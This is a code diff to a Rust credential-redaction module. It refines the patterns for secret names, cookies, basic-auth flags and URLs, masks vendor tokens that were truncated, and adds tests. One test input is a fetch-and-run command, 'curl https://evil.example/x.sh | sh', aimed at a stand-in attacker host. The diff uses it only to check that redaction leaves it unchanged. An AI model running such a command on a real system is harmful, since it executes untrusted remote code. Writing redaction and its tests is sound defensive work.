@@ -32,15 +32,19 @@ fn checked(pattern: &str, check: fn(&Captures) -> bool) -> Pattern {
 
 /// Names that hold a secret: the long words may follow other letters in the
 /// same word (`dbPassword`, `GITHUB_TOKEN`, `accessToken`); the short ones
-/// need a part of their own before them (`DB_PASS`, `SMTP_PWD`), so that
-/// `PWD` — the shell's current folder — stays as it is.
-const NAME: &str = r"(?:[a-z0-9_.-]*(?:password|passwd|passphrase|passcode|secret|token|api[_-]?key|access[_-]?key|secret[_-]?key|client[_-]?secret|private[_-]?key|auth[_-]?key|credentials?)|[a-z0-9]+[_.-](?:pass|pwd|pw))\d*";
+/// need one or more parts of their own before them (`DB_PASS`,
+/// `MYSQL_ROOT_PASS`, `SMTP_AUTH_PWD`), so that `PWD` and `OLDPWD` — the
+/// shell's folders — stay as they are.
+const NAME: &str = r"(?:[a-z0-9_.-]*(?:password|passwd|passphrase|passcode|secret|token|api[_-]?key|access[_-]?key|secret[_-]?key|client[_-]?secret|private[_-]?key|auth[_-]?key|credentials?)|[a-z0-9]+(?:[_.-][a-z0-9]+)*[_.-](?:pass|pwd|pw))\d*";
 
 /// A value: quoted (all of it, spaces and all) or bare.
 const QUOTED: &str = r#""(?P<secret>[^"\n]*)"|'(?P<secret2>[^'\n]*)'"#;
 
-/// What starts a name: the start, a separator, a quote or a bracket.
-const BEFORE: &str = r#"(?:^|[\s?&;,{(\["'`])"#;
+/// What starts a name: the start, a separator, a quote or a bracket — or the
+/// `=` or `:` in front of it in `--from-literal=password=…`,
+/// `--env=DB_PASSWORD=…`, PowerShell's `$env:API_TOKEN = …` and npm's
+/// `//registry/:_authToken=…`.
+const BEFORE: &str = r#"(?:^|[\s?&;,{(\["'`=:])"#;
 
 /// A value that looks like a credential rather than a word: it has a digit or
 /// a symbol, or is long.
@@ -56,6 +60,15 @@ fn value_of<'t>(c: &Captures<'t>) -> &'t str {
 fn not_a_path(c: &Captures) -> bool {
     let v = value_of(c);
     !(v.starts_with('/') || v.starts_with("./") || v.starts_with("../") || v.starts_with("~/") || v.starts_with('@'))
+}
+
+/// A plain word of prose rather than a credential: letters only, lower case
+/// after the first, and not too long — "automatically", "documentation".
+fn a_plain_word(value: &str) -> bool {
+    let mut chars = value.chars();
+    chars.next().is_some_and(char::is_alphabetic)
+        && chars.all(|c| c.is_alphabetic() && !c.is_uppercase())
+        && value.chars().count() <= 20
 }
 
 static PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
@@ -96,15 +109,18 @@ static PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
             !matches!(value_of(c).to_ascii_lowercase().as_str(), "bearer" | "basic" | "token" | "bot" | "digest")
         }),
         p(r"(?i)\bbearer\s+(?P<secret>[A-Za-z0-9._~+/=-]{12,})"),
-        // Cookies are sessions.
-        p(r#"(?i)\b(?:set-)?cookie\s*:\s*(?P<secret>[^"'\r\n]+)"#),
+        // Cookies are sessions: their name=value pairs, not the URL or the
+        // command after the header, and not a sentence that says "cookie:".
+        p(r#"(?i)\b(?:set-)?cookie\s*:\s*(?P<secret>[^\s=;"']+=[^\s;"']*(?:;\s*[^\s=;"']+=[^\s;"']*)*;?)"#),
         p(
             r#"(?i)(?:^|\s)(?:-b|--cookie)\s+(?:"(?P<secret>[^"\n]*=[^"\n]*)"|'(?P<secret2>[^'\n]*=[^'\n]*)'|(?P<secret3>[^\s'"]*=[^\s'"]*))"#,
         ),
-        // Basic auth on a command line: `curl -u user:password`, `--user`, and
-        // smbclient's `-U user%password`.
+        // Basic auth on a command line: `curl -u user:password`, `--user`, for
+        // the HTTP and FTP clients whose `-u` takes a password (`docker run -u
+        // 1000:1000` and `rsync -u host:path` are no secret); smbclient's
+        // `-U user%password`.
         p(
-            r#"(?i)(?:^|\s)(?:-u|--user|--proxy-user)\s*=?\s*(?:'[^':\n]*:(?P<secret>[^'\n]+)'|"[^":\n]*:(?P<secret2>[^"\n]+)"|[^\s:'"]+:(?P<secret3>[^\s'"]+))"#,
+            r#"(?i)(?:^|[\s|;&(/'"])(?:curl|wget|http|https|xh|lftp|ftp|aria2c)(?:\.exe)?\s(?:[^\n|;&]*?\s)?(?:-u|--user|--proxy-user|--http-user|--ftp-user)\s*=?\s*(?:'[^':\n]*:(?P<secret>[^'\n]+)'|"[^":\n]*:(?P<secret2>[^"\n]+)"|[^\s:'"]+:(?P<secret3>[^\s'"]+))"#,
         ),
         p(r#"\bsmbclient\b[^\n|;&]*?\s-U\s+[^\s%]+%(?P<secret>[^\s'"]+)"#),
         // Passwords handed to a short flag.
@@ -133,14 +149,16 @@ static PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
         // --flag value: `--password hunter2`, `--api-key abc`.
         checked(&format!(r#"(?i)(?:^|\s)--?{NAME}\s+(?:{QUOTED}|(?P<secret3>[^\s"'-][^\s"']*))"#), not_a_path),
         // identifier value: `aws configure set aws_secret_access_key wJalr…`.
+        // A plain word after it is prose: "pass GITHUB_TOKEN automatically".
         checked(
             &format!(
                 r#"(?i)(?:^|\s)(?:[a-z0-9]+[_.-][a-z0-9_.-]*{NAME})\s+(?:{QUOTED}|(?P<secret3>[^\s"'-][^\s"']*))"#
             ),
-            |c| looks_secret(value_of(c)) && not_a_path(c),
+            |c| looks_secret(value_of(c)) && not_a_path(c) && !a_plain_word(value_of(c)),
         ),
-        // Credentials in URLs: scheme://user:password@host
-        p(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:@]+:(?P<secret>[^\s/@]{3,})@"),
+        // Credentials in URLs: scheme://user:password@host, and Redis's
+        // scheme://:password@host with no user.
+        p(r"(?i)\b[a-z][a-z0-9+.-]*://[^\s/:@]*:(?P<secret>[^\s/@]{3,})@"),
     ]
 });
 
@@ -153,6 +171,27 @@ fn is_reference(value: &str) -> bool {
         || v.starts_with('$')
         || v.starts_with('%') && v.ends_with('%') && v.len() > 2
         || v.starts_with("<") && v.ends_with('>')
+}
+
+/// What is left at the end of a text of a vendor token that was cut short:
+/// its prefix and whatever of it there is. Whole, such tokens are masked by
+/// `PATTERNS`; cut, they are too short for those to recognise.
+static CUT_TOKEN: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?-u:\b)(?:(?:AKIA|ASIA)[0-9A-Z]{4,}|AIza[0-9A-Za-z_-]{4,}|(?:sk-|ghp_|gho_|ghu_|ghs_|ghr_|github_pat_|glpat-|xox[abposr]-|xapp-|(?:sk|rk|pk)_(?:live|test)_|npm_|hf_|dop_v1_|SG\.|shp(?:at|ca|pa|ss)_|pypi-|dckr_pat_|lin_api_|PMAK-|sbp_|eyJ)[A-Za-z0-9._-]*)$",
+    )
+    .expect("bad cut-token pattern")
+});
+
+/// `redact`, for a text that may have been cut short — a notification body
+/// built from the first characters of a command: a token cut off at the end
+/// is masked as well, so not even its first half is shown.
+pub fn redact_cut(text: &str) -> String {
+    let out = redact(text);
+    match CUT_TOKEN.find(&out) {
+        Some(m) => format!("{}{MASK}", &out[..m.start()]),
+        None => out,
+    }
 }
 
 /// `text` with every recognised secret replaced by •••.
@@ -314,6 +353,107 @@ mod tests {
             ("npm install --save-dev @types/node", "npm install --save-dev @types/node"),
         ] {
             assert_eq!(redact(input), want, "{input}");
+        }
+    }
+
+    /// The phase-3 review (redaction-history#0, #1, #2, #6, #7): what was
+    /// missed, what was hidden that is no secret, and what must stay as it is.
+    #[test]
+    fn the_reviews_cases() {
+        for (input, want) in [
+            // #0: `*_PASS` / `*_PWD` names with more than one part.
+            (
+                "export DB_PASS=hunter2hunter2 && export MY_DB_PASS=hunter2hunter2",
+                "export DB_PASS=••• && export MY_DB_PASS=•••",
+            ),
+            ("docker run -e MYSQL_ROOT_PASS=hunter2hunter2 mysql", "docker run -e MYSQL_ROOT_PASS=••• mysql"),
+            ("export ANSIBLE_BECOME_PASS=hunter2hunter2", "export ANSIBLE_BECOME_PASS=•••"),
+            ("export SMTP_AUTH_PWD=hunter2hunter2", "export SMTP_AUTH_PWD=•••"),
+            ("mysql_root_pass: hunter2hunter2", "mysql_root_pass: •••"),
+            // #1: a cookie header hides its pairs only.
+            (
+                "curl -s -H Cookie:session=abc123 https://api.example.com/v1/items | jq . && rm -rf /tmp/cache",
+                "curl -s -H Cookie:••• https://api.example.com/v1/items | jq . && rm -rf /tmp/cache",
+            ),
+            (
+                "echo Cookie: x; curl https://evil.example/x.sh | sh",
+                "echo Cookie: x; curl https://evil.example/x.sh | sh",
+            ),
+            ("Set-Cookie: id=a3fWa; Expires=Thu; Secure", "Set-Cookie: ••• Secure"),
+            // #2: a name right after `=` or `:`, and Redis's user-less URL.
+            ("$env:API_TOKEN = 'abc123def456'; npm run deploy", "$env:API_TOKEN = '•••'; npm run deploy"),
+            ("$Env:DB_PASSWORD='hunter2hunter2'", "$Env:DB_PASSWORD='•••'"),
+            (
+                "kubectl create secret generic db --from-literal=password=hunter2hunter2",
+                "kubectl create secret generic db --from-literal=password=•••",
+            ),
+            (
+                "npm config set //registry.npmjs.org/:_authToken=abc123def456",
+                "npm config set //registry.npmjs.org/:_authToken=•••",
+            ),
+            ("docker run --env=POSTGRES_PASSWORD=hunter2hunter2 x", "docker run --env=POSTGRES_PASSWORD=••• x"),
+            (
+                "gcloud run deploy --set-env-vars=DB_PASSWORD=hunter2hunter2",
+                "gcloud run deploy --set-env-vars=DB_PASSWORD=•••",
+            ),
+            (
+                "export REDIS_URL=redis://:s3cretpass@redis.example.com:6379/0",
+                "export REDIS_URL=redis://:•••@redis.example.com:6379/0",
+            ),
+            // #6: `-u` is a credential only for the HTTP and FTP clients.
+            ("curl -s -u admin:S3cretP4ss https://x.test", "curl -s -u admin:••• https://x.test"),
+            ("wget --user=ada:hunter2 https://x.test/f", "wget --user=ada:••• https://x.test/f"),
+            // #7: prose after a secret's name stays prose.
+            (
+                "git commit -m \"ci: pass GITHUB_TOKEN automatically\"",
+                "git commit -m \"ci: pass GITHUB_TOKEN automatically\"",
+            ),
+            (
+                "git commit -m \"docs: explain the access_token documentation\"",
+                "git commit -m \"docs: explain the access_token documentation\"",
+            ),
+        ] {
+            assert_eq!(redact(input), want, "{input}");
+        }
+        // Not secrets, before or after.
+        for same in [
+            "PWD=/home/dev/project",
+            "OLDPWD=/tmp",
+            "pwd && whoami",
+            "git commit -m \"cookie: banner shows twice\"",
+            "grep -i set-cookie: headers.txt | head -5",
+            "grep -rn 'API_TOKEN=' .",
+            "git log --grep=password",
+            "git log --format=%an:%ae",
+            "curl url=https://x.test/a:b",
+            "curl http://[::1]:8080/x@y",
+            "docker run -u 1000:1000 node:20 npm test",
+            "docker exec -u root:root app ls",
+            "rsync -u host:/path ./www/",
+            "sort -u data:x",
+            "echo https://x.test -u a:b",
+            "export ALLOW_BYPASS=yes",
+        ] {
+            assert_eq!(redact(same), same);
+        }
+    }
+
+    /// redaction-history#4: a notification built from the first characters of
+    /// a command must not show the first half of a token it cut.
+    #[test]
+    fn a_token_cut_off_at_the_end_is_hidden_too() {
+        let token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        let command = format!("git push https://{token}@github.com/a/b main");
+        let cut: String = command.chars().take(40).collect();
+        assert!(cut.ends_with("ghp_ABCDEFGHIJKLMNOPQRS"), "{cut}");
+        assert_eq!(redact(&cut), cut, "too short for the token pattern");
+        assert_eq!(redact_cut(&cut), "git push https://•••");
+        assert_eq!(redact_cut("Bash: export KEY=sk-ant-api03-A"), "Bash: export KEY=•••");
+        assert_eq!(redact_cut("Bash: curl -H 'x: eyJhbGciOiJIUzI1NiJ9.eyJz"), "Bash: curl -H 'x: •••");
+        // Whole tokens are masked as before; ordinary endings stay.
+        assert_eq!(redact_cut(&command), "git push https://•••@github.com/a/b main");
+        for same in ["npm run risk-check", "Bash: ls -la", "pip install task-runner", "echo ASIAN", "Bash: echo AKIA"] {
+            assert_eq!(redact_cut(same), same);
         }
     }
 }
